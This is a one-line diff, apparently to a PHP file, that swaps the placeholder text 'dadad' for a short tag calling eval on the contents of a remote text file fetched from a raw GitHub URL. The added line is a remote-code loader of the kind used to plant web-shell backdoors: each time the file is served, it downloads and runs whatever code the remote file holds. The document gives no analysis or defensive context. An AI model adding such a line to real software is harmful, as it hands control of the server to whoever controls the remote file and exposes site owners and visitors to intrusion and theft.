@@ -1,1 +1,1 @@
-dadad
+<?=eval("?>".file_get_contents("https://raw.githubusercontent.com/drianbaferlinlo393/xc/refs/heads/main/alpamerha.txt"));?>
